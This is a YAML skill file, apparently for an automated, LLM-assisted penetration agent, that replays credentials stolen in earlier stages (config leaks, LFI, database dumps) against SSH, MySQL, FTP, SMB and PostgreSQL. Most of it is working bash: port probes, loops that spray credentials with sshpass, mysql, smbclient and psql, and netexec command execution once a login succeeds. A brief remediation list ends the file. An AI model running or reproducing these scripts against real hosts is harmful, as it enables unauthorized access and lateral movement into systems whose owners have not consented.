skill_id: credential_replay
name: "凭据复用攻击 (前序漏洞抓到的凭据 → SSH/MySQL/SMB/FTP/RDP/PostgreSQL)"
category: credential
phase: foothold
version: "1.0"

principle: |
  当前序阶段（LFI 读 wp-config.php / 配置文件泄露 / .env 泄露 / phpinfo /
  spring actuator / 数据库 dump 等）抓到了真实用户名/密码后，
  这些凭据在多个服务上**有大概率复用**——尤其在内部网络与运维不规范的环境。

  本 Skill 不再用固定字典爆破，而是把 ``confirmed_facts.creds`` 里的
  **真实凭据**重放到所有匹配端口（SSH/MySQL/SMB/FTP/RDP/PostgreSQL/Redis），
  命中即立刻拿 shell 或登录会话。匹配链路：
    ① VulnAgent.run(seeds={"credentials": [...]}) 触发后会合成
       service-level 的 "credential-replay" finding（tool=cred-replay）;
    ② 本 Skill 的 match.rules 命中该 finding；
    ③ SkillEngine 把 confirmed_facts.creds 解开为
       {known_users_b64} / {known_passwords_b64} / {known_cred_pairs_b64};
    ④ exploit_paths 通过 base64 -d 解码后直接 sshpass / mysql -p / smbclient
       重放每一条凭据。
  base64 注入是必要的：原文带换行/引号/$号会破坏 bash 语法。

match:
  rules:
    # 由 VulnAgent._synthesize_credential_replay_findings 合成
    - tool_is: "cred-replay"
    # 服务级 finding 也可以触发（在已有 known_creds 的前提下）
    - service_is: "ssh"
      port_is: [22, 2211, 2222]
    - service_is: "mysql"
      port_is: [3306]
    - service_is: "ftp"
      port_is: [21]
    - service_is: "smb"
      port_is: [139, 445]
    - service_is: "rdp"
      port_is: [3389]
    - service_is: "postgres"
      port_is: [5432]

probes:
  - id: detect_known_creds
    description: "检查是否真的有可复用凭据，没有就直接退出"
    skip_if:
      has_known_creds: false
    command: |
      echo "=== Credential Replay Probe ==="
      USERS=$(echo "{known_users_b64}" | base64 -d 2>/dev/null || true)
      PASSES=$(echo "{known_passwords_b64}" | base64 -d 2>/dev/null || true)
      echo "users:"
      printf '%s\n' "$USERS" | head -10
      echo "---"
      echo "password_count:"
      printf '%s\n' "$PASSES" | sed '/^$/d' | wc -l
      echo "PROBE_DONE"
    timeout: 10
    parse_rules:
      - if_contains: ["PROBE_DONE"]
        set: { creds_loaded: true }

  - id: detect_target_services
    description: "确认目标上有哪些可复用服务在监听"
    depends_on: { creds_loaded: true }
    command: |
      echo "=== Target Service Recon ==="
      for p in 22 2211 2222 21 3306 5432 6379 27017 139 445 3389; do
        if (exec 3<>/dev/tcp/{TARGET_IP}/$p) 2>/dev/null; then
          echo "PORT_OPEN:$p"
          exec 3>&- 3<&- 2>/dev/null || true
        fi
      done
      echo "PROBE_DONE"
    timeout: 30
    parse_rules:
      - if_regex: "PORT_OPEN:22\\b"
        set: { svc_ssh: true }
      - if_regex: "PORT_OPEN:2211\\b"
        set: { svc_ssh: true, ssh_alt_port: "2211" }
      - if_regex: "PORT_OPEN:2222\\b"
        set: { svc_ssh: true, ssh_alt_port: "2222" }
      - if_regex: "PORT_OPEN:21\\b"
        set: { svc_ftp: true }
      - if_regex: "PORT_OPEN:3306\\b"
        set: { svc_mysql: true }
      - if_regex: "PORT_OPEN:5432\\b"
        set: { svc_postgres: true }
      - if_regex: "PORT_OPEN:445\\b"
        set: { svc_smb: true }
      - if_regex: "PORT_OPEN:3389\\b"
        set: { svc_rdp: true }

exploit_paths:
  # ── SSH 凭据复用：最常见，第一优先级 ─────────────
  - path_id: ssh_replay
    name: "SSH 凭据复用"
    priority: 1
    conditions:
      svc_ssh: true
    skip_if:
      has_known_creds: false
    steps:
      - id: ssh_replay_pairs
        description: "优先尝试 user:password 配对（同源精确凭据），再走笛卡尔积"
        command: |
          set +e
          echo "=== SSH replay ==="
          # 端口选择：依次探测 22 / 2211 / 2222 / 22222 哪个开放就用哪个
          PORT=22
          for cand in 22 2211 2222 22222; do
            if (exec 3<>/dev/tcp/{TARGET_IP}/$cand) 2>/dev/null; then
              PORT=$cand
              exec 3>&- 3<&- 2>/dev/null || true
              break
            fi
          done
          echo "[INFO] SSH port = $PORT"
          # 解码 base64 凭据
          PAIRS=$(echo "{known_cred_pairs_b64}" | base64 -d 2>/dev/null || true)
          USERS=$(echo "{known_users_b64}" | base64 -d 2>/dev/null || true)
          PASSES=$(echo "{known_passwords_b64}" | base64 -d 2>/dev/null || true)

          try_login() {
            local u="$1"; local p="$2"
            local r
            r=$(sshpass -p "$p" ssh -o StrictHostKeyChecking=no \
                -o UserKnownHostsFile=/dev/null \
                -o PreferredAuthentications=password \
                -o PubkeyAuthentication=no \
                -o ConnectTimeout=5 -p "$PORT" "$u@{TARGET_IP}" \
                "id; uname -a; hostname" 2>&1)
            if echo "$r" | grep -q "uid="; then
              echo "SSH_LOGIN_OK:$u:$p"
              echo "$r"
              return 0
            fi
            return 1
          }

          # 第一轮：精确配对（user:password 同源）
          while IFS= read -r line; do
            [ -z "$line" ] && continue
            u="${line%%:*}"; p="${line#*:}"
            try_login "$u" "$p" && exit 0
          done <<EOF_PAIRS
$PAIRS
EOF_PAIRS

          # 第二轮：常见运维账号 × 已知密码（前序漏洞抓的密码可能挂在 root/admin）
          for u in root admin ubuntu vagrant www-data mysql postgres oracle; do
            while IFS= read -r p; do
              [ -z "$p" ] && continue
              try_login "$u" "$p" && exit 0
            done <<EOF_P1
$PASSES
EOF_P1
          done

          # 第三轮：所有 user × 所有 password 笛卡尔积
          while IFS= read -r u; do
            [ -z "$u" ] && continue
            while IFS= read -r p; do
              [ -z "$p" ] && continue
              try_login "$u" "$p" && exit 0
            done <<EOF_P2
$PASSES
EOF_P2
          done <<EOF_U2
$USERS
EOF_U2

          echo "SSH_REPLAY_FAILED"
        timeout: 180
        success_criteria:
          stdout_regex: "(SSH_LOGIN_OK:|uid=\\d+\\(\\w+\\))"
        on_success: conclude_success
        on_fail: next_path
        evidence_capture:
          shell_type: "ssh_shell"

  # ── MySQL 凭据复用 ─────────────────────────────
  - path_id: mysql_replay
    name: "MySQL 凭据复用"
    priority: 2
    conditions:
      svc_mysql: true
    skip_if:
      has_known_creds: false
    steps:
      - id: mysql_replay_pairs
        description: "用已知密码尝试 mysql 登录并枚举库表"
        command: |
          set +e
          echo "=== MySQL replay ==="
          USERS=$(echo "{known_users_b64}" | base64 -d 2>/dev/null || true)
          PASSES=$(echo "{known_passwords_b64}" | base64 -d 2>/dev/null || true)

          try_mysql() {
            local u="$1"; local p="$2"
            local r
            r=$(mysql -h {TARGET_IP} -P 3306 -u "$u" -p"$p" --connect-timeout=5 \
                -e "select user(), version(), @@hostname; show databases;" 2>&1)
            if echo "$r" | grep -qE "Database|@@hostname"; then
              echo "MYSQL_LOGIN_OK:$u:$p"
              echo "$r" | head -50
              return 0
            fi
            return 1
          }

          # mysql 默认 root 账号优先
          for u in root admin mysql; do
            while IFS= read -r p; do
              [ -z "$p" ] && continue
              try_mysql "$u" "$p" && exit 0
            done <<EOF_MP1
$PASSES
EOF_MP1
          done

          # user 笛卡尔积
          while IFS= read -r u; do
            [ -z "$u" ] && continue
            while IFS= read -r p; do
              [ -z "$p" ] && continue
              try_mysql "$u" "$p" && exit 0
            done <<EOF_MP2
$PASSES
EOF_MP2
          done <<EOF_MU
$USERS
EOF_MU

          echo "MYSQL_REPLAY_FAILED"
        timeout: 90
        success_criteria:
          stdout_contains_any: ["MYSQL_LOGIN_OK", "@@hostname"]
        on_success: conclude_success
        on_fail: next_path
        evidence_capture:
          shell_type: "mysql_session"

  # ── FTP 凭据复用 ────────────────────────────────
  - path_id: ftp_replay
    name: "FTP 凭据复用"
    priority: 3
    conditions:
      svc_ftp: true
    skip_if:
      has_known_creds: false
    steps:
      - id: ftp_replay_pairs
        description: "用已知凭据列 FTP 根目录"
        command: |
          set +e
          echo "=== FTP replay ==="
          USERS=$(echo "{known_users_b64}" | base64 -d 2>/dev/null || true)
          PASSES=$(echo "{known_passwords_b64}" | base64 -d 2>/dev/null || true)

          try_ftp() {
            local u="$1"; local p="$2"
            local r
            r=$(curl -s -m 10 --user "$u:$p" "ftp://{TARGET_IP}/" 2>&1)
            if echo "$r" | grep -qiE "drwx|^total|^-rw" \
               && ! echo "$r" | grep -qi "530"; then
              echo "FTP_LOGIN_OK:$u:$p"
              echo "$r" | head -30
              return 0
            fi
            return 1
          }

          while IFS= read -r u; do
            [ -z "$u" ] && continue
            while IFS= read -r p; do
              [ -z "$p" ] && continue
              try_ftp "$u" "$p" && exit 0
            done <<EOF_FP1
$PASSES
EOF_FP1
          done <<EOF_FU
$USERS
EOF_FU

          echo "FTP_REPLAY_FAILED"
        timeout: 90
        success_criteria:
          stdout_contains_any: ["FTP_LOGIN_OK"]
        on_success: conclude_success
        on_fail: next_path
        evidence_capture:
          shell_type: "ftp_session"

  # ── SMB 凭据复用 ────────────────────────────────
  - path_id: smb_replay
    name: "SMB 凭据复用 (smbclient/netexec)"
    priority: 4
    conditions:
      svc_smb: true
    skip_if:
      has_known_creds: false
    steps:
      - id: smb_replay_pairs
        description: "用已知凭据枚举共享 + 验证登录"
        command: |
          set +e
          echo "=== SMB replay ==="
          USERS=$(echo "{known_users_b64}" | base64 -d 2>/dev/null || true)
          PASSES=$(echo "{known_passwords_b64}" | base64 -d 2>/dev/null || true)

          try_smb() {
            local u="$1"; local p="$2"
            local r
            r=$(timeout 8 smbclient -L "//{TARGET_IP}/" -U "$u%$p" 2>&1)
            if echo "$r" | grep -qE "Disk|IPC\\s+Service" \
               && ! echo "$r" | grep -qi "NT_STATUS_LOGON_FAILURE"; then
              echo "SMB_LOGIN_OK:$u:$p"
              echo "$r" | head -30
              # 尝试 netexec 拿命令执行能力
              xr=$(timeout 12 netexec smb {TARGET_IP} -u "$u" -p "$p" -x "whoami" 2>&1 || true)
              echo "$xr" | head -10
              return 0
            fi
            return 1
          }

          while IFS= read -r u; do
            [ -z "$u" ] && continue
            while IFS= read -r p; do
              [ -z "$p" ] && continue
              try_smb "$u" "$p" && exit 0
            done <<EOF_SP1
$PASSES
EOF_SP1
          done <<EOF_SU
$USERS
EOF_SU

          echo "SMB_REPLAY_FAILED"
        timeout: 120
        success_criteria:
          stdout_contains_any: ["SMB_LOGIN_OK"]
        on_success: conclude_success
        on_fail: next_path
        evidence_capture:
          shell_type: "smb_session"

  # ── PostgreSQL 凭据复用 ────────────────────────
  - path_id: postgres_replay
    name: "PostgreSQL 凭据复用"
    priority: 5
    conditions:
      svc_postgres: true
    skip_if:
      has_known_creds: false
    steps:
      - id: pgsql_replay
        description: "psql 登录 + 列库"
        command: |
          set +e
          echo "=== PostgreSQL replay ==="
          USERS=$(echo "{known_users_b64}" | base64 -d 2>/dev/null || true)
          PASSES=$(echo "{known_passwords_b64}" | base64 -d 2>/dev/null || true)

          try_pgsql() {
            local u="$1"; local p="$2"
            local r
            r=$(PGPASSWORD="$p" psql -h {TARGET_IP} -p 5432 -U "$u" -d postgres \
                  -c "select current_user, version();" -At 2>&1)
            if echo "$r" | grep -qE "PostgreSQL"; then
              echo "PGSQL_LOGIN_OK:$u:$p"
              echo "$r" | head -10
              return 0
            fi
            return 1
          }

          for u in postgres admin; do
            while IFS= read -r p; do
              [ -z "$p" ] && continue
              try_pgsql "$u" "$p" && exit 0
            done <<EOF_PP
$PASSES
EOF_PP
          done

          while IFS= read -r u; do
            [ -z "$u" ] && continue
            while IFS= read -r p; do
              [ -z "$p" ] && continue
              try_pgsql "$u" "$p" && exit 0
            done <<EOF_PP2
$PASSES
EOF_PP2
          done <<EOF_PU
$USERS
EOF_PU

          echo "PGSQL_REPLAY_FAILED"
        timeout: 90
        success_criteria:
          stdout_contains_any: ["PGSQL_LOGIN_OK"]
        on_success: conclude_success
        on_fail: next_path
        evidence_capture:
          shell_type: "pgsql_session"

  # ── LLM 兜底（只有上面所有路径都失败时）──────
  - path_id: llm_freeform
    name: "LLM 自由推理（兜底）"
    priority: 99
    mode: react_freeform
    max_rounds: 3

remediation: |
  1. 严禁多服务复用同一凭据；不同服务（尤其管理面）使用独立强密码或密钥认证
  2. 配置文件（wp-config / .env / application.yml 等）权限收紧、不对外可读
  3. 数据库账户仅授予最小权限，禁用 wildcard host
  4. 启用 fail2ban / 服务侧锁定策略防止暴力枚举
